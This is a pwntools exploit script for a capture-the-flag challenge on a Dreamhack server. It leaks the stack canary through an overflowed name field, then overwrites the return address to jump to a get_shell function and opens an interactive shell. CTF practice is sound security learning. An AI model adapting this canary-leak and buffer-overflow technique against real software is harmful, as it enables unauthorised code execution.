from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug"

e = ELF('./chall')
HOST, PORT = "host8.dreamhack.games 10656".split()

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process('./chall')

get_shell = 0x401216 # NO PIE

# 32(0x20) + 56(0x38) + 4(0x4) + 4(0x4)
# = 0x58 + 0x8, 0x60, 0x60 + 0x8 = 0x68

p.sendafter(b'name: ', b'A'*0x38)
p.sendlineafter(b'age: ', b'21474836472147483647')
p.sendlineafter(b'height: ', b'21474836472147483647')
p.sendafter(b'): ', b'BNKAI')
p.recvuntil(b'BNKAI')

cnry = u64(b'\x00' + p.recvn(7))
print("cnry: ", hex(cnry))

pay = b'A'*0x68
pay += p64(cnry) + b'BANKAIAA' + p64(get_shell) # there's a saved register s
# # gdb.attach(p)
# # pause()
p.sendlineafter(b'? ', pay)


p.interactive()